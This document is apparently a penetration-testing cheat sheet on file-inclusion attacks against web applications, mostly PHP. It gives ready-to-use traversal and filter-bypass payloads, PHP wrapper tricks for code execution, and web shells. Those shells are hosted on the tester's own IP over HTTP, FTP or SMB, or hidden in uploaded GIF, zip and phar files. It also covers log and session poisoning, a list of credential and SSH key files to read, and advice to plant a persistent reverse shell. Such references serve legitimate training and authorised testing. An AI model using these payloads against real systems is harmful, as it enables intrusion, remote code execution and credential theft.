
## Vulnerable Functions Reference

|Function|Read|Execute|Remote URL|
|---|---|---|---|
|`include()` / `include_once()` (PHP)|✅|✅|✅|
|`require()` / `require_once()` (PHP)|✅|✅|❌|
|`file_get_contents()` (PHP)|✅|❌|✅|
|`fopen()` / `file()` (PHP)|✅|❌|❌|
|`fs.readFile()` / `fs.sendFile()` (Node)|✅|❌|❌|
|`res.render()` (Node/Express)|✅|✅|❌|
|`include` / `import` (Java)|✅|✅|✅ (import only)|
|`@Html.Partial()` (.NET)|✅|❌|❌|
|`@Html.RemotePartial()` (.NET)|✅|❌|✅|
|`Response.WriteFile()` (.NET)|✅|❌|❌|
|`include` (.NET)|✅|✅|✅|

> [!tip] Only functions with Execute = ✅ allow RCE via LFI. Read-only functions still enable source disclosure, credential leakage, and SSRF.

---

## Basic LFI

```
# Absolute path (when no prefix appended)
?language=/etc/passwd
?language=C:\Windows\boot.ini

# Path traversal (when prefix directory appended: ./languages/<input>)
?language=../../../../etc/passwd

# Prefix bypass (when prefix string appended: lang_<input>)
?language=/../../../etc/passwd
```

**Calculate traversal depth:** `/var/www/html/` = 3 dirs deep → `../../../`

> [!tip] Using excessive `../` never breaks the path — extra traversals at `/` stay at `/`. Use minimum needed for clean reports, but error on the side of more.

---

## Filter Bypasses

### Non-Recursive Filter Bypass

Filter: `str_replace('../', '', $input)` — runs once, not recursive.

```
# Double payload — filter removes ../ leaving ../
?language=....//....//....//etc/passwd
?language=..././..././..././etc/passwd
?language=....\/....\/etc/passwd
```

### URL Encoding

```
# Bypass dot/slash character filters
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encode for WAF bypass
%252e%252e%252f  →  decodes to %2e%2e%2f  →  decodes to ../
```

### Approved Path Bypass

Filter: `preg_match('/^\.\/languages\/.+$/', $input)`

```
# Start with approved path, then traverse out
?language=./languages/../../../../etc/passwd
```

### Appended Extension Bypasses

**Path Truncation** (PHP < 5.3/5.4, max 4096 chars):

```bash
# Generate payload: non_existing_dir/../../../etc/passwd/ + 2048× ./
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
# .php extension gets truncated at 4096 char limit
```

**Null Byte** (PHP < 5.5):

```
?language=/etc/passwd%00
# Result: /etc/passwd%00.php → null byte terminates → reads /etc/passwd
```

---

## PHP Filters (Source Code Disclosure)

```bash
# Fuzz for PHP files first
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<IP>:<PORT>/FUZZ.php

# Read PHP source via base64 filter (bypasses execution)
?language=php://filter/read=convert.base64-encode/resource=config
# Note: .php auto-appended → reads config.php

# Decode output
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

> [!tip] Include all response codes (200/301/302/403) when fuzzing PHP files — LFI lets you read files you can't access directly via HTTP.

---

## PHP Wrappers (RCE)

### Check allow_url_include First

```bash
# Read PHP config via LFI
curl "http://<IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

echo '<BASE64>' | base64 -d | grep allow_url_include
# allow_url_include = On → data:// and php://input work
echo '<BASE64>' | base64 -d | grep expect
# extension=expect → expect:// may work
```

### data:// Wrapper (requires `allow_url_include = On`)

```bash
# Base64 encode web shell
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Execute
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

curl -s 'http://<IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### php://input Wrapper (requires `allow_url_include = On`, POST accepted)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

### expect:// Wrapper (external module, rarely available)

```bash
curl -s "http://<IP>:<PORT>/index.php?language=expect://id" | grep uid
```

---

## Remote File Inclusion (RFI)

**Verify RFI is possible:**

```
?language=http://127.0.0.1:80/index.php
# If page renders → RFI enabled
```

**Requirements:** `allow_url_include = On` (PHP), or Windows SMB (no PHP setting needed)

### HTTP

```bash
# Create web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Host it
sudo python3 -m http.server 80

# Include via RFI
?language=http://<OUR_IP>/shell.php&cmd=id
```

### FTP

```bash
sudo python -m pyftpdlib -p 21
?language=ftp://<OUR_IP>/shell.php&cmd=id
?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id
```

### SMB (Windows targets, no allow_url_include needed)

```bash
impacket-smbserver -smb2support share $(pwd)
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

> [!warning] Use ports 80/443 for HTTP hosting — these are more likely whitelisted through firewalls. Never use the vulnerable page itself as the RFI target (recursive inclusion = DoS).

---

## LFI + File Uploads (RCE)

### Image Upload (most reliable)

```bash
# Craft malicious image with PHP webshell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# GIF8 magic bytes pass content-type checks; works with any allowed image extension

# Upload via profile/settings page
# Find path in page source: <img src="/profile_images/shell.gif">

# Include via LFI
?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload (PHP zip:// wrapper)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# Upload shell.jpg

?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
# %23 = # (URL encoded)
```

### Phar Upload (PHP phar:// wrapper)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# Upload shell.jpg
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
# %2F = / (URL encoded)
```

---

## Log Poisoning (RCE)

### PHP Session Poisoning

```bash
# 1. Find your PHPSESSID cookie value
# 2. Read session file
?language=/var/lib/php/sessions/sess_<PHPSESSID_VALUE>
# Linux: /var/lib/php/sessions/  |  Windows: C:\Windows\Temp\

# 3. Confirm you control the page/language value in the session
?language=session_poisoning
# Re-read session file — confirm "session_poisoning" appears

# 4. Poison with PHP webshell
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# URL decoded: <?php system($_GET["cmd"]); ?>

# 5. Execute via session file inclusion
?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

> [!warning] Session file gets overwritten on each page load — must re-poison before each execution, or write a persistent webshell to disk first.

### Apache / Nginx Log Poisoning

```bash
# Default log locations
# Apache Linux:   /var/log/apache2/access.log
# Apache Windows: C:\xampp\apache\logs\access.log
# Nginx Linux:    /var/log/nginx/access.log
# Nginx Windows:  C:\nginx\log\access.log

# 1. Verify log is readable
?language=/var/log/apache2/access.log

# 2. Poison User-Agent header
curl -s "http://<IP>:<PORT>/index.php" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# Or via Burp — modify User-Agent in intercepted request

# 3. Include poisoned log + execute
?language=/var/log/apache2/access.log&cmd=id
```

**Other poisonable logs:**

```
/var/log/sshd.log      → SSH login with PHP as username
/var/log/mail          → send email with PHP body
/var/log/vsftpd.log    → FTP login with PHP username
/proc/self/environ     → User-Agent poisoning
/proc/self/fd/N        → (N = 0-50, various FDs)
```

---

## Automated Scanning

```bash
# Fuzz for hidden parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=value' -fs <BASELINE_SIZE>

# Fuzz LFI payloads
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=FUZZ' -fs <BASELINE_SIZE>

# Fuzz webroot path
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE_SIZE>

# Fuzz server configs/logs (download LFI-WordList-Linux separately)
ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <BASELINE_SIZE>
```

**Read config to find log paths:**

```bash
curl http://<IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
# Look for: DocumentRoot, CustomLog, ErrorLog, APACHE_LOG_DIR

curl http://<IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
# Look for: export APACHE_LOG_DIR=/var/log/apache2
```

---

## Attack Decision Tree

```
LFI confirmed?
├── Can include remote URLs? (test: ?language=http://127.0.0.1:80/index.php)
│   └── YES → RFI → host shell.php → HTTP/FTP/SMB include
├── allow_url_include = On?
│   ├── YES → data:// or php://input wrapper → instant RCE
│   └── NO ↓
├── File upload available?
│   ├── YES → upload shell.gif → include via LFI → RCE
│   └── NO ↓
├── Can read log files? (/var/log/apache2/access.log, session files)
│   ├── YES → log/session poisoning → RCE
│   └── NO ↓
├── Can read PHP source? → php://filter/read=convert.base64-encode
│   └── Hunt credentials, keys, DB passwords, other vulns
└── expect:// available? → check php.ini for extension=expect → RCE
```

---

## Key Files to Read

```bash
# Credentials / system info
/etc/passwd
/etc/shadow          # needs root
/etc/hosts
/proc/self/environ   # environment variables (may contain secrets)

# Web app config
/var/www/html/config.php   # or config.inc.php, database.php, settings.php
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/nginx/nginx.conf

# PHP config (find version from server headers first)
/etc/php/7.4/apache2/php.ini
/etc/php/8.0/apache2/php.ini
/etc/php/7.4/fpm/php.ini

# SSH keys (if username known from /etc/passwd)
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa

# Windows equivalents
C:\Windows\boot.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
C:\Windows\System32\drivers\etc\hosts
```

> [!tip] Second-order LFI: set username/profile field to `../../../etc/passwd` during registration → another function (e.g., avatar display) loads it. Defenders protect direct input but trust DB values.

> [!warning] Log poisoning in production: large log files can crash the server on inclusion. Be careful with timing and frequency. Write a persistent reverse shell immediately after achieving RCE — don't keep re-poisoning.